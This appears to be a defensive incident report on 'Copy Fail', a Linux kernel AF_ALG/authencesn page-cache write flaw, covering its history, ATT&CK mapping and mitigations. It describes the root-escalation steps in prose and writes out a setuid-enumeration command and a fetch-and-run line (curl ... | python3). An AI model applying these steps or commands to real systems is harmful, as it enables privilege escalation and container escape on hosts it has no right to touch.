Phase 1 · Pre-incident conditions
2011Pre-incident

authencesn AEAD wrapper added to kernel

RFC 4303 IPsec ESN support. Uses caller's destination buffer as scratch space — harmless under the AEAD interface as it existed in 2011.

Commit a5079d084f8b. Under the old AEAD interface, associated data lived in a separate scatterlist, and the only caller was the kernel's own xfrm/IPsec layer. No userspace ever observed the intermediate writes. The decision was reasonable on its own terms.Source [2] · Confidence: Confirmed
Expand detail
2015Pre-incident

AF_ALG gains AEAD support; authencesn migrated

algif_aead.c added — exposes kernel's AEAD ciphers to unprivileged userspace via AF_ALG sockets. Out-of-place operation kept page cache pages out of the writable destination.

In the same year authencesn was converted to the new AEAD interface (commit 104880a6b470), introducing the assoclen + cryptlen offset that writes past the contracted output boundary. Still safe because req->src and req->dst were separate scatterlists. Page cache pages from splice() lived in src (read-only); the scratch write went to dst (the user's buffer). Not yet exploitable.Source [2] · Confidence: Confirmed
Expand detail
Jul 2017 · kernel 4.14Pre-incident

In-place optimization added to algif_aead.c — the bug is born

Performance optimization chains tag pages by reference using sg_chain(); req->src = req->dst. Page cache pages from splice() are now in the writable destination scatterlist.

Commit 72548b093ee3. The intersection of three reasonable changes — the 2011 authencesn scratch-write convention, the 2015 AF_ALG splice path, and this 2017 in-place optimization — creates the bug. Each change reasonable in isolation; nobody connected the optimization to authencesn's scratch writes or to splice()'s use of page cache pages.Source [2, 5, 8] · Confidence: Confirmed

2017 → 2026Pre-incident

≈9 years of silent exposure

05Attack chain · MITRE ATT&CK

A short chain by design.

That economy is part of what makes it dangerous. Five dominant techniques drive the exploit. Each card expands for the concrete description and source-graded confidence.

TA0004 · Privilege Escalation
T1068

Exploitation for Privilege Escalation

The whole exploit, distilled. Open AF_ALG socket, bind to authencesn, splice setuid binary's page cache pages, trigger AEAD decrypt, watch the 4-byte scratch write land in the cached binary, exec.

An unprivileged local user opens an AF_ALG socket, binds to authencesn(hmac(sha256),cbc(aes)), splices page cache pages of a setuid-root binary (default: /usr/bin/su) into the crypto pipeline, and triggers an AEAD decrypt. The authencesn algorithm performs a 4-byte scratch write at offset assoclen + cryptlen — outside its contracted output region — which lands inside the chained tag pages, modifying the kernel's cached copy of the setuid binary. HMAC verification fails and recvmsg() returns an error, but the page-cache corruption persists. Repeating at successive offsets stages shellcode into /usr/bin/su's cached pages. Executing su afterward runs the corrupted binary with UID 0. Root.

Source [1, 2, 5] High Confidence
Expand
TA0004 · Privilege Escalation
T1611

Escape to Host

The Linux page cache is shared host-wide across all processes — including across container boundaries. A pod with the right primitives compromises the node and crosses tenant boundaries.

This is what elevates Copy Fail from "another Linux LPE" to a Kubernetes node compromise vector. When an unprivileged process inside a container splices a setuid binary's page cache pages into the AF_ALG socket and triggers the scratch write, the corruption applies to the host's cached copy of that binary — not just the container's view. Theori labels Copy Fail a "container escape primitive"; their Part 2 writeup on Kubernetes container escape is forthcoming.

Source [1, 2, 6, 7] High Confidence
Expand
TA0006 · Credential Access
T1212

Exploitation for Credential Access

Alternate path: instead of corrupting setuid binaries, flip the user's UID field in /etc/passwd's page cache to 0000. Same primitive, different target file, same outcome.

Documented in the third-party reproduction at github.com/rootsecdev within 24 hours of the original disclosure. The attacker uses the same 4-byte page-cache-write primitive to flip the running user's UID field in /etc/passwd's in-memory page cache to 0000. A subsequent su invocation — with the user's own password — yields a root shell because libc's UID lookup now reports UID 0. This was published within 24 hours of original disclosure and demonstrates how quickly the universal write primitive can be retargeted by the community.

Source [12] Medium Confidence
Expand
TA0007 · Discovery
T1083

File and Directory Discovery

Setuid binary enumeration as exploit pre-step. PoC accepts any setuid binary as argv[1] — find / -perm -4000 finds the candidates.

The default exploit targets /usr/bin/su, but Theori's PoC accepts any setuid binary as argv[1]. In a real exploitation scenario the attacker enumerates setuid-root binaries on the host (find / -perm -4000 -type f 2>/dev/null) to identify the most reliable target. On hardened or minimized distros, alternatives include sudo, passwd, mount, chsh, newgrp. This is observable in process telemetry, which matters for detection.

TA0002 · Execution
T1059.006

Command and Scripting Interpreter: Python

732-byte Python script. Standard library only — os, socket, zlib. Python 3.10+ is on every modern enterprise Linux distribution by default.

The exploit is 732 bytes. Python 3.10+ standard library only — os, socket, zlib. No compiled payloads, no dependency installation, no build step. Critical to the threat model: Python 3.10+ is present by default on every modern enterprise Linux distribution, and the standard library alone is sufficient. The exploit needs no toolchain on the target, no network egress for dependency download, no privilege escalation merely to run the script. A non-root user with shell access — the minimum foothold — can execute the entire chain.

TA0005 · Defense Evasion
T1564

Hide Artifacts

The 4-byte write goes to page cache only. Kernel never marks it dirty for writeback. AIDE, Tripwire, rpm -V, debsums all see a clean file.

The corrupted in-memory copy is what gets read on every subsequent read(), mmap(), and execve() — until the page is evicted by memory pressure or reboot, at which point the cache reloads from the unchanged on-disk copy and the modification is gone with no trace. Invisible to disk forensics, ephemeral on reboot.

TA0005 · Defense Evasion
T1497

Virtualization/Sandbox Evasion

Standard Linux containers share a kernel with the host and are not a security boundary against Copy Fail. Firecracker microVMs, V8 isolates, gVisor are not affected.

Bugcrowd's framing: "the boundaries that hold are the ones that don't share a kernel." AWS Lambda and Fargate (Firecracker), Cloudflare Workers (V8 isolates), gVisor's user-space kernel — all structurally outside Copy Fail's blast radius. Standard Docker/containerd/runc are not.

T1556

Modify Authentication Process

06Where this fits in the standards landscape

Three frameworks, three jobs.

CWE names the underlying weakness. NIST CSF 2.0 names the organizational response. OWASP LLM Top 10 names the environment the next disclosure lands in. Each does work the others don't.

The underlying weakness is described by CWE-1188 (Initialization with Insecure Default), with CWE-787 (Out-of-bounds Write) as the proximate symptom. The organizational response maps to four NIST CSF 2.0 functions: PR.PS, PR.IR, DE.CM, GV.RM. The environment the next disclosure will land in is the world the OWASP LLM Top 10's LLM06 (Excessive Agency) describes — AI agents on both sides of the attack chain. The mapping below is what each framework actually contributes.

Underlying weakness

CWE-1188
Initialization of a Resource with an Insecure Default

The 2017 in-place optimization set up the AEAD operation with page-cache pages reachable through a writable scatterlist. The API's implicit contract — "every AEAD algorithm will confine its writes to the legitimate destination" — was unstated and unenforced.

Primary driver
CWE-787
Out-of-bounds Write (partial fit)

authencesn writes 4 bytes at dst[assoclen + cryptlen] — past the contracted AEAD output region. Technically correct, operationally incomplete: the algorithm believes it owns that scratch space; the bounds violation only matters because of the upstream initialization weakness.

Contributing factor

Organizational response · NIST CSF 2.0

PR.PS
Platform Security

Kernel patching cadence, kernel module configuration, seccomp profiles, kernel-version awareness across the fleet — all PR.PS. The CSA paper's storm-class Risk #1 maps here.

Primary driver
PR.IR
Infrastructure Resilience

Network segmentation, isolation of multi-tenant workloads, architectural choice of isolation boundary (microVM vs. container vs. VM vs. dedicated host). What limits Copy Fail's blast radius is the architecture, not the patch alone.

Contributing factor
DE.CM
Continuous Monitoring

Runtime detection of unexpected AF_ALG SEQPACKET socket creation. Sysdig's published Falco rule is exactly this control. Detection complements but doesn't replace patching.

Contributing factor
GV.RM
Risk Management Strategy

The CSA paper's Risk #5 — "Cybersecurity Risk Model Outdated" — is the meta-risk this report makes the case for. Pre-AI assumptions about exploit timelines, patch windows, and kernel-LPE rarity may not hold.

Primary driver

The environment · OWASP LLM Top 10

LLM06
Excessive Agency

The CSA AI Vulnerability Storm paper maps this to the broader risk of AI agents on both sides of the attack chain — offensive scanners like Xint Code on the discovery side, defensive coding/review agents on the response side. Not a weakness in Copy Fail itself; the standard that names the operating environment every Copy-Fail-class disclosure now lands in. Forward-looking framing for the recommendations section.

07What existed and could have helped

Eight controls were available. Each one helped somewhere in the industry.

The question is what made each one hard to extend further. No blame. Every gap below is structural — coverage, prioritization, operational readiness for a faster window. Click any item to see the constructive reframing.

01

Kernel patching cadence aligned to upstream stable releases

Detail

What it would have done

Distributions tracking mainline closely (Arch Linux's model) had a closed window before the public PoC dropped. Mainline patched 1 April; PoC public 29 April. An organization on Arch had 28 days of head start. Organizations on longterm series 6.12, 6.6, 6.1, 5.15, or 5.10 were waiting on backports that had not yet landed in the upstream stable queues by 29 April.

Why it was not effective everywhere

Coverage gap by design — enterprise distributions are built around longterm kernel series for stability, regression testing, and customer support obligations. Arch tracks mainline; enterprise workloads do not run on Arch. The longterm-stable model trades patch latency for stability — that trade has held up for years and is not wrong on its own terms.

The longterm kernel model is not broken. The structural problem is that the assumption underlying it — that the gap between mainline patch and broad distro shipment is a low-risk window — is being eroded by direct PoC publication on disclosure day. Eddie Chapman's note on oss-security — "backporting that far back is not as straightforward" — describes legitimate engineering work, not negligence.

Source & grounding

NIST SP 800-53 SI-2; CIS Controls v8 Control 7; NIST CSF 2.0 PR.PS-02. Source [4, 9, 11].

02

MicroVM / VM-level isolation for untrusted workloads

Detail

What it would have done

Workloads on Firecracker microVMs (AWS Lambda, Fargate), V8 isolates (Cloudflare Workers), or gVisor's user-space kernel are structurally outside Copy Fail's blast radius — they don't share a Linux kernel page cache with the host or other tenants. Bugcrowd: "the boundaries that hold are the ones that don't share a kernel."

Why it was not effective everywhere

Coverage gap — most enterprise Kubernetes clusters, CI runners, and self-hosted PaaS environments run untrusted code in standard Linux containers. The dominant industry posture for the last decade has been "containers are good enough for many workloads," and that has been correct for a wide range of threat models.

This is not a "containers are insecure" finding. It is a "container as a security boundary against shared-kernel LPE primitives" finding — which has been called out for years and was again acknowledged in Bugcrowd's commentary: "Containers were never meant to be a security boundary anyway." The constructive question is workload-specific: which workloads warrant a stronger boundary, and what would migrating them cost?

Source & grounding

NIST SP 800-190 §4.5; AWS Firecracker design; Google gVisor design. Source [1, 7].

03

Seccomp profile blocking AF_ALG socket creation

Detail

What it would have done

A seccomp profile denying socket(AF_ALG, ...) on container or sandbox workloads makes the very first step of the chain impossible. The exploit cannot get past socket(38, 5, 0). CERT-EU recommends this for containerized environments regardless of patch state.

Why it was not effective everywhere

Default Docker and Kubernetes seccomp profiles do not block AF_ALG. Most containerized workloads in production today do not have a custom seccomp profile that would have closed this path before disclosure. Custom profiles are non-trivial to author and maintain.

The reason most environments don't have custom seccomp profiles is not laziness — it is the realistic cost-benefit calculation of operational simplicity vs. defense-in-depth. What Copy Fail changes is the cost-benefit calculation for untrusted-code workloads specifically: AF_ALG is a path very few legitimate application workloads need, and blocking it is a low-cost, high-value deny rule.

Source & grounding

Linux seccomp documentation; Docker default seccomp profile; Kubernetes seccomp documentation. Source [1, 3].

04

Runtime detection of unexpected AF_ALG SEQPACKET socket creation

Detail

What it would have done

A Falco rule flagging AF_ALG SEQPACKET socket creation by any process outside a known disk-encryption toolchain whitelist (cryptsetup, systemd-cryptsetup, veritysetup, integritysetup, kcapi-* tools) catches the mandatory first syscall of the chain. Sysdig published exactly this rule within hours of disclosure; Sysdig Secure customers had it deployed automatically.

Why it was not effective everywhere

The rule did not exist as a published detection prior to disclosure (no disclosure, no rule). Pre-disclosure, an enterprise would have needed an in-house detection engineering team independently identifying AF_ALG SEQPACKET socket creation as anomalous, or a behavioral-baseline approach. Coverage of either is uneven.

Detection engineering is by nature lagging — rules follow disclosed CVEs. The structural lesson is that environments running runtime behavioral detection (Falco, Sysdig Secure, Tetragon, vendor EDR equivalents) had a same-day path to coverage. Environments relying solely on signature-based scanners did not. This isn't a per-tool endorsement; it's a category observation.

Source & grounding

Falco (CNCF graduated project); NIST CSF 2.0 DE.CM; MITRE ATT&CK detection guidance for T1068. Source [5].

05

Live kernel patching capability

Detail

What it would have done

Live kernel patching (kpatch on RHEL, Canonical Livepatch on Ubuntu, kgraft on SUSE) applies a patched function to a running kernel without rebooting. For environments where reboots are operationally expensive — large fleets, stateful services, regulated reboot windows — live patching closes the gap between "patched package available" and "patched kernel running on the host."

Why it was not effective everywhere

Live patching depends on (a) the distribution offering it, (b) the organization having a subscription, and (c) the patch being released in a livepatch-compatible format. As of the report's as-of date, livepatch-compatible packages for Copy Fail were still being prepared. Adoption is correlated with operational maturity and budget.

Live patching is high-leverage for the patch-availability-to-deployment gap, but it is one tool in a portfolio. It does not replace the need to reduce the upstream gap (mainline → distro shipment) — it just helps close the downstream gap (distro shipment → host). Both gaps matter.

Source & grounding

NIST SP 800-53 SI-2(5); kpatch / Livepatch / kgraft documentation.

06

Egress filtering and network segmentation

Detail

What it would have done

Copy Fail has no remote vector. To reach the LPE in production, an attacker needs unprivileged local execution — typically via web RCE, SSH foothold, malicious PR on a CI runner, or compromised AI agent sandbox. Egress filtering on application-tier hosts limits an attacker's ability to download the exploit (curl https://copy.fail/exp | python3). Segmentation limits how far root compromise propagates. The CSA paper notes egress filtering "blocked every public log4j exploit."

Why it was not effective everywhere

Egress filtering coverage is uneven. Many shops apply it rigorously to internet-facing servers but loosely to internal CI runners, build hosts, and developer infrastructure — exactly the surfaces where Copy Fail is most consequential. Pod-to-node segmentation is impossible without a different isolation primitive.

Egress filtering is not a Copy Fail control specifically — it is a general control that happens to disrupt one common delivery path. The 732-byte exploit can also be copy-pasted from an attacker who already has shell access; egress filtering doesn't help in that case. The honest framing: high-leverage defense in depth, not a single-layer fix.

Source & grounding

CIS Controls v8 Controls 12 & 13; NIST CSF 2.0 PR.IR; NIST SP 800-207. Source [1, 11].

07

Inventory of multi-tenant and untrusted-code-executing surfaces

Detail

What it would have done

An accurate, current inventory of which hosts run untrusted code, multi-tenant workloads, or shared-kernel containers — vs. which hosts are single-tenant, first-party-only — is what makes patch prioritization possible at speed. The disclosure's prioritization guidance is explicit: multi-tenant hosts → K8s → CI runners → SaaS sandboxes → standard servers → workstations. Without trust-posture-tagged inventory, that prioritization can't execute.

Why it was not effective everywhere

Inventory completeness is one of the longest-standing weak points in enterprise security posture, repeatedly identified across CIS, NIST, and SANS year after year. The CSA paper flags this as Risk #6 — HIGH severity — specifically because AI-accelerated discovery aggravates it. The reason inventory is hard is well-understood: distributed ownership, shadow IT, ephemeral cloud resources, container churn.

Inventory is structurally hard. The constructive lesson is not "shame on you for not having a perfect inventory" — it is that the prioritization decisions a CISO makes in a fast-moving disclosure are gated by inventory quality. Investments in inventory pay returns precisely in the moments that matter most.

Source & grounding

NIST CSF 2.0 ID.AM; CIS Controls v8 Control 1; CSA Priority Action 7. Source [1, 11].

08

Coordinated disclosure pipeline with capacity for fast-tracked critical advisories

Detail

What it would have done

The Linux kernel's coordinated disclosure process worked well for Copy Fail at the upstream layer — 9 days from report to mainline patch is fast by any historical measure. Where the system is showing strain is downstream propagation: from upstream patch to distro-shipped kernel to enterprise-deployed kernel.

Why it was not effective everywhere

This is not a case where the pipeline failed. The kernel team's response was textbook. The strain is at scale: as more LLM-assisted reports arrive (CSA paper cites kernel maintainer reports climbing from 2/week to 10/week), the same headcount triages more reports under similar embargo pressure, while distros face the same backporting queue across more concurrent CVEs.

The kernel community's response here is the good news in the story. The structural lesson is that the pipeline that worked well for Copy Fail will be load-tested by volume in the months ahead. The Linux kernel maintainers asking "what should embargo policy look like in the LLM age?" on oss-security is the system trying to adapt; defenders should expect to adapt alongside them.

The takeaway
